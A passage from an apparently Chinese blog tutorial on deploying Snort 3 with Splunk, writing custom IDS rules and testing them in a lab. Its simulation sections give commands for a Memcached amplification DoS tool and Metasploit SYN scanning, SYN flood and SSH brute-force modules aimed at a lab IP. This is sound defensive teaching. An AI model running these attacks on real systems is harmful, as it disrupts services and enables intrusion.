<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c6472f2bd9a.png" /></p>
<p>现在，让加载前面用baidu和icmp规则创建的local.rules文件。将使用-R标志从命令行加载这个规则文件，而不是在配置文件中加载。加载规则文件并测试配置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snort -c /usr/local/etc/snort/snort.lua -R /usr/local/etc/rules/local.rules</span><br></pre></td></tr></table></figure>
<p>滚动回输出，你会看到加载了local.rules文件，并在计数中添加了另外两条规则：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c647462730f.png" /></p>
<p>注意，由于复制了snort规则集的配置文件,
baidu规则将不起作用。规则集中的snort.lua文件，默认情况下没有启用OpenApplD。可以通过编辑/usr/local/etc/snort/snort.lua简单地重新启用该文件【操作同前】：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c6475c70739.png" /></p>
<p>像前面一样进行测试，会看到更多的警报记录到的控制台：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo snort -c /usr/local/etc/snort/snort.lua  -R /usr/local/etc/rules/local.rules  -i ens33 -A alert_fast -s 65535 -k none -l /var/log/snort</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64762075a5.png" /></p>
<h3
id="导入pcap数据包到snort测试规则">7、导入PCAP数据包到Snort测试规则</h3>
<p>将PCAP文件传递到Snort并将警报输出到.csv。 下载macdc
2012数据集【PCAP文件】，测试从内置规则和社区规则生成警报。开始下载两个pcap文件【文件比较大，建议用主机单独下载】：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">mkdir</span> pcaps</span><br><span class="line"><span class="built_in">cd</span> pcaps</span><br><span class="line">wget https://download.netresec.com/pcap/maccdc-2012/maccdc2012_00000.pcap.gz</span><br><span class="line">gunzip maccdc2012_00000.pcap.gz</span><br><span class="line">wget https://download.netresec.com/pcap/maccdc-2012/maccdc2012_00001.pcap.gz</span><br><span class="line">gunzip maccdc2012_00001.pcap.gz</span><br></pre></td></tr></table></figure>
<p>现在运行snort，告诉它加载下载的第一个pcap文件，加载所有规则(从snort.lua中)，并将警告打印到控制台。不需要加载local.rules文件，因为它实际上只对测试snort是否正确工作有用。由于数据包较大（1G）需要较长时间来运行，可以使用ctrl-c来停止它：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snort -c /usr/local/etc/snort/snort.lua  -r ~/pcaps/maccdc2012_00000.pcap -A alert_fast -s 65535 -k none</span><br></pre></td></tr></table></figure>
<p>标志【命令参数】说明：</p>
<p>标志</p>
<p>解释</p>
<p>sudo snort</p>
<p>这是正在调用的snort二进制文件。</p>
<p>-c /usr/local/etc/snort/snort.lua</p>
<p>这是snort.lua配置文件。</p>
<p>r ~/pcaps/maccdc2012_00000.pcap</p>
<p>pcap文件的路径。</p>
<p>-A alert_fast</p>
<p>使用alert_fast插件输出到控制台。</p>
<p>-s 65535</p>
<p>设置snaplen，使Snort不会截断或丢弃过大的包。</p>
<p>-k none</p>
<p>忽略错误的校验和，否则snort将丢弃带有错误校验和的包，它们不会被计算。</p>
<p>如果要同时处理多个pcap文件，修改最后一条命令，扫描同一目录下的所有pcap文件，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snort -c /usr/local/etc/snort/snort.lua --pcap-filter \*.pcap  --pcap-dir ~/pcaps -A alert_fast -s 65535 -k none</span><br></pre></td></tr></table></figure>
<p>标志【命令参数】说明：</p>
<p>标志</p>
<p>解释</p>
<p>–pcap-filter *.pcap</p>
<p>这告诉snort如何识别位于pcap-dir中的pcap文件。</p>
<p>–pcap-dir ~/pcaps</p>
<p>这将告诉Snort pcap文件所在的目录。</p>
<p>输出：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64803a1ec2.png" /></p>
<p>可以修改最后一个命令，以使用任何输出插件【前面一直在使用alert_fast插件将事件打印到控制台】，可以在命令行中指定它，就像上面使用-A标志所做的那样，也可以在snort中启用该插件snort.lua文件。例如，要使用alert
csv插件将警报数据保存到csv文件中，需要修改snort.lua：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c6480b75dc5.png" /></p>
<p>然后运行snort，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo snort -c /usr/local/etc/snort/snort.lua  -r ~/pcaps/maccdc2012_00000.pcap  -s 65535 -k none -l /var/log/snort -q -m 0x1b</span><br></pre></td></tr></table></figure>
<p>首先，将注意到，在Snort处理PCAP文件时，屏幕上没有输出任何内容。当运行上述命令时，不会看到任何输出打印到控制台，因为正在向csv文件写入警报，并使用q标志抑制所有其他输出。可能会注意到一些与lua检测器odp服务相关的错误，这些可以忽略。另外也没有前面那样在命令行中指定输出插件，这是因为在snort.lua中启用了alert_csv插件。并在命令行中指定一个，将优先于在snort.lua中配置的任何输出插件。正在使用的新标志如下所示：</p>
<p>新标志</p>
<p>解释</p>
<p>-l /var/log/snort</p>
<p>应该保存输出文件的文件夹。</p>
<p>-q</p>
<p>安静模式，不显示横幅和状态报告</p>
<p>-m 0x1b</p>
<p>这将写入文件的umask设置为033。</p>
<p>umask：默认情况下，Snort使用的umask值为077，这将阻止所有者的任何人读取日志文件。当试图使用其他工具摄取日志时，除非它们正在运行，否则会导致问题。为解决这个问题，可以使用-m标志传递一个新的umask
033(二进制为000 011
011，十六进制为ox1b)，这意味着的日志文件将具有权限：rwxr-r-，允许每个人都能够读取这些文件。如果有特定的安全需求，需将此设置更改为更具限制性。在Snort时，这些文件将由根用户拥有，如上面所述运行。
当返回到命令提示符时，这意味着Snort已经完成了对pcap文件的处理。应该在/var/log/snort/目录中看到警报alert_csv.txt。
可以使用wc -1命令，可以看到从这些pcap文件中生成了多少警报。在这里，可以看到文件中有4031632行，因为每一行都是一个单独的警报。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c648357adb4.png" /></p>
<h3 id="json警告输出插件">8、JSON警告输出插件</h3>
<p>为了方便地将Snort
3警报日志文件导入所选的SIEM【Splunk】，需要使用alert
json输出插件将所有警报写入json格式的文本文件。启用json输出插件只需修改snort.lua文件即可：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /usr/local/etc/snort/snort.lua</span><br></pre></td></tr></table></figure>
<p>首先，通过在插件中的每行前面放置两个破折号来禁用alert
_csv插件，并启用alert
json插件，如下所示。也可以同时启用这两个插件，这样就可以同时获得表示相同警告的csv和json文件。注意，缩进使用4个空格代替制表符：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--alert_csv =</span><br><span class="line">--&#123;</span><br><span class="line">----file = <span class="literal">true</span>,</span><br><span class="line">--&#125;</span><br><span class="line"></span><br><span class="line">alert_json =</span><br><span class="line">&#123;</span><br><span class="line">    file = <span class="literal">true</span>,</span><br><span class="line">    <span class="built_in">limit</span> = 10,</span><br><span class="line">    fields = <span class="string">&#x27;seconds action class b64_data dir dst_addr \</span></span><br><span class="line"><span class="string">        dst_ap dst_port eth_dst eth_len eth_src eth_type gid icmp_code \</span></span><br><span class="line"><span class="string">        icmp_id icmp_seq icmp_type iface ip_id ip_len msg mpls pkt_gen \</span></span><br><span class="line"><span class="string">        pkt_len pkt_num priority proto rev rule service sid src_addr \</span></span><br><span class="line"><span class="string">        src_ap src_port target tcp_ack tcp_flags tcp_len tcp_seq \</span></span><br><span class="line"><span class="string">        tcp_win tos ttl udp_len vlan timestamp&#x27;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c648c63a050.png" /></p>
<p>在alert json插件中，指定了三个选项：
首先，使用file选项来允许将警报输出到json格式的文件(而不是输出到控制台)。接下来，指定limit选项来告诉Snort何时转到新文件。当输出文件达到10
MB时，将使用文件名中的当前unixtime创建一个新文件。为了进行测试，将这个值设置为10
MB，在生产系统上，这个值会增加到100
MB或更大。最后，指定fields选项，该选项标识警报的哪些特定字段应该包含在json输出中。这里选择了每个可能的输出字段。
注意：经过测试后，可以选择删除其中的一些字段，vlan和mpls字段通常是不需要的，b64_data包含整个包的有效载荷，为了节省空间，可以删除这些字段。不要删除seconds字段，并确保它始终是列出的第一个字段。这将允许Splunk正确地处理事件。
像前面一样运行Snort扫描pcap文件，并输出到json格式的文本文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo snort -c /usr/local/etc/snort/snort.lua --pcap-filter \*.pcap  --pcap-dir ~/pcaps -l /var/log/snort -s 65535 -k none -m 0x1b</span><br></pre></td></tr></table></figure>
<p>一旦Snort完成了pcap文件的处理，就可以查看日志文件夹(上面用-l
/var/log/snort指定)，将看到包含所有警报的json文件：
将注意到有许多警报alert_json.txt.nnnnnnnnnn文件。这些数字表示创建文件的unixtime，每个文件都是在snort.lua中指定的10
MB。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c648d6d43df.png" /></p>
<h3 id="snort启动脚本">9、Snort启动脚本</h3>
<p>创建一个systemD脚本，以便在启动时自动运行snort。出于安全原因，还将在启动后以普通(非root)用户的身份运行snort。首先创建snort用户和组：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo groupadd snort</span><br><span class="line">sudo useradd snort -r -s /sbin/nologin -c SNORT_IDS -g snort</span><br></pre></td></tr></table></figure>
<p>删除旧的日志文件【可选】：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">rm</span> /var/log/snort/*</span><br></pre></td></tr></table></figure>
<p>需要将‘snort’用户权限授予日志目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> -R 5775 /var/log/snort</span><br><span class="line">sudo <span class="built_in">chown</span> -R snort:snort /var/log/snort</span><br></pre></td></tr></table></figure>
<p>创建systemD服务文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /lib/systemd/system/snort3.service</span><br></pre></td></tr></table></figure>
<p>编写以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Snort3 NIDS Daemon</span><br><span class="line">After=syslog.target network.target</span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line"></span><br><span class="line">ExecStart=/usr/local/bin/snort -c /usr/local/etc/snort/snort.lua  -R /usr/local/etc/rules/local.rules -s 65535 -k none -l /var/log/snort -D -u snort -g snort -i ens33 -m 0x1b</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
<p>注，“-R /usr/local/etc/rules/local.rules”是加载自己配置的规则，可选。
应该熟悉传递给Snort的所有标志，因为它们与在前面的示例中使用的标志相同。添加了-D标志，它允许Snort作为守护进程运行。如果想运行不同的选项，可以在这里添加它们。下面是使用的所有标志的说明：</p>
<p>标志</p>
<p>解释</p>
<p>/usr/local/bin/snort</p>
<p>这是到snort二进制文件的路径。这里不使用sudo，因为脚本将以提升(root)权限启动。</p>
<p>-c /usr/local/etc/snort/snort.lua</p>
<p>这是snort.lua的配置文件。</p>
<p>-s 65535</p>
<p>设置snaplen，使Snort不会截断和删除超大的包。</p>
<p>-k none</p>
<p>忽略错误的校验和，否则snort将丢弃带有错误校验和的包，它们不会被计算。</p>
<p>-l /var/log/snort</p>
<p>文件夹的路径，Snort将存储它输出的所有日志文件。</p>
<p>-D</p>
<p>作为守护进程运行</p>
<p>-u snort</p>
<p>在启动之后(以及在执行任何需要提升特权的操作之后)，切换到以“snort”用户的身份运行。</p>
<p>-g snort</p>
<p>启动之后，作为“snort”组运行。</p>
<p>-i ens33</p>
<p>要监听的接口。</p>
<p>-m 0x1b</p>
<p>文件权限的Umask为033。</p>
<p>启用并启动Snort systemD服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> snort3</span><br><span class="line">sudo service snort3 start</span><br></pre></td></tr></table></figure>
<p>检查服务状态：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service snort3 status</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c649a2c28b5.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c649a82a498.png" /></p>
<p>如果有任何问题，可以使用以下命令查看服务的完整输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo journalctl -u snort3.service</span><br></pre></td></tr></table></figure>
<h2 id="安装并配置splunk">3. 安装并配置Splunk</h2>
<p>使用SIEM(安全信息和事件管理)解决方案,将以图表等方式显示Snort生成的所有警报,并会给一些强大的工具来搜索和理解这些警报,以及画出更深层次的信息。后面以企业版Splunk做演示【试用，60天过期】。替代软件是Elasticstack的ELK栈(配置更复杂)。
需要在Splunk的网站上创建一个免费帐户来下载软件和附加组件。导航到Splunk的主页，点击右上角的绿色Free
Splunk按钮，创建一个新帐户【如果已有帐户，可以直接登录】。在“Splunk
Free”下，点击“Download”链接。
在下载页面上，单击Linux选项卡，然后单击.deb旁边的立即下载按钮【因为运行的是Ubuntu，一个基于debian的系统】。同意许可，然后点击“立即开始下载”按钮。下载页面会自动打开一个窗口，以保存下载到的本地系统。如果你想用wget下载安装程序，你可以取消这个下载，然后单击download
via Command Line (wget)复制下载的wget 地址。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c649e5e6632.png" /></p>
<h3 id="安装splunk">1、安装Splunk</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dpkg -i splunk-8.*.deb</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c649f8bc03f.png" /></p>
<p>安装时出现curl找不到，自己单独安装即可。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64a045acae.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64a09835aa.png" /></p>
<p>这将安装Splunk到/opt/Splunk。注意，安装Splunk的磁盘空间必须有5
GB的空闲空间，否则Splunk将无法启动。Splunk存储所有收集的日志数据的索引位于安装位置的子文件夹中，因此请确保该卷上有足够的空间用于收集所有数据
第一次启动Splunk系统将提示为Splunk创建一个新的管理用户和密码。保存这些凭证，因为稍后会使用它们登录到web界面：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /opt/splunk/bin/splunk start --answer-yes --accept-license</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64a3aa93fe.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64a4074370.png" /></p>
<p>然后，将Splunk配置为在引导时自动启动。也将为Splunk启用systemD并启动服务。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /opt/splunk/bin/splunk stop</span><br><span class="line">sudo /opt/splunk/bin/splunk <span class="built_in">enable</span> boot-start -systemd-managed 1</span><br><span class="line">sudo service Splunkd start</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64a8ea94cb.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64a93d6532.png" /></p>
<p>不要立即启动，否则会出现上图情况，先做如下修改</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64a9e2d727.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64aa3e7af8.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64aa963352.png" /></p>
<p>Splunk服务器监听在服务器的8000端口【web访问：http://localhost:8000】。用户名和密码是在安装Splunk时设置的。</p>
<h3 id="splunk基本配置">2、Splunk基本配置</h3>
<h4 id="安装解析json的插件">2.1 安装解析JSON的插件</h4>
<p>Snort3 JSON Alerts可以获取和收集Snort
3创建的日志，并对它们进行规范化【确保字段命名与NIDS数据一致，以便Splunk应用程序可以显示数据】。
使用安装过程中创建的用户名和密码登录到Splunk实例【http://localhost:8000】。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64ad6cbd1f.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64adbce64e.png" /></p>
<p>主页上点击“+Find More
Apps”链接。它链接到Splunkbase【在线插件仓库】，它可以扩展和增强Splunk安装的功能。在Splunkbase中搜索Snort 3，将看到一个结果：Snort3
JSON Alerts。点击这个插件的安装按钮：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64ae440fed.png" /></p>
<p>在注册下载Splunk插件时，输入前面下载Splunk时官网创建的用户名和密码【注意，不是本地Splunk服务器实例创建的用户名和密码】。接受条款和条件，并点击登录和安装，一旦安装完成，点击完成。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64ae8c4229.png" /></p>
<p>插件已安装，对其进行基本的配置，以告诉Splunk Snort
3生成的日志文件存储在何处，以便Splunk能够找到它们。通过配置文件的命令行来实现这一点：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> /opt/splunk/etc/apps/TA_Snort3_json/local</span><br><span class="line">sudo <span class="built_in">touch</span> /opt/splunk/etc/apps/TA_Snort3_json/local/inputs.conf</span><br><span class="line">sudo vim /opt/splunk/etc/apps/TA_Snort3_json/local/inputs.conf</span><br></pre></td></tr></table></figure>
<p>在input.conf文件中输入以下文本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[monitor:///var/log/snort/*alert_json.txt*]</span><br><span class="line">sourcetype = snort3:alert:json</span><br></pre></td></tr></table></figure>
<p>重启Splunk：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service Splunkd restart</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64b1e10dd3.png" /></p>
<p>Splunk启动时，它会扫描/var/log/snort目录中的json文件，web登录测试，单击左侧的Search
&amp; Reporting APP链接。在搜索栏中输入以下文本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sourcetype=<span class="string">&quot;snort3:alert:json&quot;</span></span><br></pre></td></tr></table></figure>
<p>然后点击开始搜索。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64b411fb8a.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64b45f227e.png" /></p>
<p>由图知已显示服务器正在收集的所有事件。
注意，如果没有看到任何警告，可以使用ping和wget
baidu.com触发一些新的警告。在Splunk中生成的事件和显示的事件之间有轻微的延迟。如果继续没有看到任何警告，将时间范围【搜索图标旁边的下拉菜单设置为过去24小时】更改为"所有时间"并重新运行搜索。如果仍然没有看到任何事件，请检查/var/log/snort文件夹中是否有json文件。</p>
<h4 id="配置电子邮件服务后面告警需用">2.2
配置电子邮件服务【后面告警需用】</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64b5f5ef39.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64b66d3c00.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64b89aedef.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64b8e694d6.png" /></p>
<h4 id="配置邮件告警以metasploit-的syn-端口扫描告警为例">2.3
配置邮件告警【以Metasploit 的SYN 端口扫描告警为例】</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64ba41bb93.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64ba92c368.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64bb2cec2e.png" /></p>
<p>触发效果：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64bd203cda.png" /></p>
<h3 id="splunk基本使用测试">3、Splunk基本使用测试</h3>
<p>要在包含时间、源、目标和消息的表中显示所有事件，请执行以下搜索：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sourcetype=<span class="string">&quot;snort3:alert:json&quot;</span></span><br><span class="line"> table _time src_ap dst_ap msg</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64bf28ee66.png" /></p>
<p>按目的地显示所有事件的统计：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sourcetype=<span class="string">&quot;snort3:alert:json&quot;</span></span><br><span class="line"> stats count by dest</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64c289b579.png" /></p>
<p>在地图上显示所有事件来源：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sourcetype=<span class="string">&quot;snort3:alert:json&quot;</span></span><br><span class="line"> iplocation src_addr</span><br><span class="line"> stats count by Country</span><br><span class="line"> geom geo_countries featureIdField=<span class="string">&quot;Country&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64c5627581.png" /></p>
<h2 id="nids自定义规则测试">4. NIDS自定义规则测试</h2>
<h3 id="检测icmp">1、检测ICMP</h3>
<h4 id="规则">1.1 规则</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">alert icmp  any  any &lt;&gt; 10.10.10.200 any (msg:<span class="string">&quot;ICMP message detected&quot;</span>; sid:2000001;)</span><br></pre></td></tr></table></figure>
<h4 id="splunk分析">1.2 Splunk分析</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64cc9baad6.png" /></p>
<h3 id="检测基于memcached的drdos">2、检测基于Memcached的DRDOS</h3>
<h4 id="规则-1">2.1规则</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">alert udp any 11211 -&gt; any any (msg:<span class="string">&quot;Memcached DRDOS&quot;</span>;classtype:attempted-dos;content:<span class="string">&quot;STAT&quot;</span>;dsize:&gt;1000; sid:2000002;)</span><br></pre></td></tr></table></figure>
<h4 id="模拟攻击">2.2模拟攻击</h4>
<p>（1）环境部署【Kali】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Srar/MemcacheDos.git</span><br><span class="line"><span class="built_in">cd</span> MemcacheDos</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
<p>（2）攻击</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./node_modules/.bin/ts-node main.ts --list result.txt --ip 10.10.10.200 --port 80</span><br></pre></td></tr></table></figure>
<h4 id="splunk分析-1">2.3 Splunk分析</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64cde93725.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64ce39618a.png" /></p>
<h3 id="检测msf的syn端口扫描">3、检测MSF的SYN端口扫描</h3>
<h4 id="规则-2">3.1规则</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">alert tcp any any -&gt; 10.10.10.200 any (msg:<span class="string">&quot;MSF SYN scanning detected&quot;</span>; flags:S; ttl:=32; detection_filter:track by_src, count 30, seconds 20;ack:0; sid:2000003;)</span><br></pre></td></tr></table></figure>
<p>注，Metasploit所发数据包的TTL是32。</p>
<h4 id="模拟攻击-1">3.2模拟攻击</h4>
<p>终端命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfdb init</span><br><span class="line">Msfconsole</span><br><span class="line">use auxiliary/scanner/portscan/syn</span><br><span class="line"><span class="built_in">set</span> ports 1-50</span><br><span class="line"><span class="built_in">set</span> rhosts 10.10.10.200</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64d3b6b9de.png" /></p>
<h4 id="splunk分析-2">3.3 Splunk分析</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64d45bcec1.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64d4bd4de6.png" /></p>
<h3 id="检测msf的syn-flood">4、检测MSF的SYN Flood</h3>
<h4 id="规则-3">4.1规则</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">alert tcp any any -&gt;  10.10.10.200 80 (msg:<span class="string">&quot;MSF DoS attack&quot;</span>; flags:S; detection_filter:track by_dst, count 100, seconds 60; sid:2000004;)</span><br></pre></td></tr></table></figure>
<h4 id="模拟攻击-2">4.2模拟攻击</h4>
<p>msf所用模块：auxiliary/dos/tcp/synflood，用show
options查看需要设置的信息，设置需要指定的信息，操作和3.2相似，run之后即可查看攻击检测效果。</p>
<h4 id="splunk分析-3">4.3 Splunk分析</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64d58078b5.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64d5cf3aae.png" /></p>
<h3 id="检测msf的ssh爆破">5、检测MSF的SSH爆破</h3>
<h4 id="规则-4">5.1规则</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">alert tcp any any -&gt; 10.10.10.200 22 (msg:<span class="string">&quot;MSF SSH brute force&quot;</span>;content:<span class="string">&quot;SSH-2.0&quot;</span>;detection_filter:track by_src, count 3, seconds 30; sid:2000005)</span><br></pre></td></tr></table></figure>
<h4 id="模拟攻击-3">5.2模拟攻击</h4>
<p>msf所用模块“auxiliary/scanner/ssh/ssh_login”，操作和前面相似。</p>
<h4 id="splunk分析-4">5.3 Splunk分析</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64d814cf88.png" /></p>
<h2 id="远程控制客户端的开发">5. 远程控制客户端的开发</h2>
<h3 id="客户端开发">1、客户端开发</h3>
<p>利用c#开发基于SSH（Renci.SshNet库）连接的远程控制软件。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c67b697348b.png" /></p>
<p>基本功能：服务器基本管理，即可以远程执行操作命令，并有所反馈；NIDS远程管理，如配置检测规则，审查日志等；Splunk管理，如实时监控NIDS,制定告警策略及响应等；防火墙（UFW）远程管理等。
对于基本功能中设计命令执行的可以用SshClient.CreateCommand(command).Execute()，SshClient.RunCommand(command).Execute()等实现，反馈信息的显示可以自定义一些函数利用richTextBox等控件显示；另外对于Splunk实时监控NIDS等可以用WebBrowser控件实现。</p>
<h3 id="远控测试">2、远控测试</h3>
<p>由于远控是基于SSH连接的，所以服务器必须装有SSH服务并启动，另外防火墙也是开启的，所以必须添加允许SSH和Splunk远程连接的规则【具体规则可以参见后面防火墙测试时查到的规则】。</p>
<h4 id="远程执行命令测试">2.1远程执行命令测试</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c67992da856.png" /></p>
<h4 id="nids测试">2.2 NIDS测试</h4>
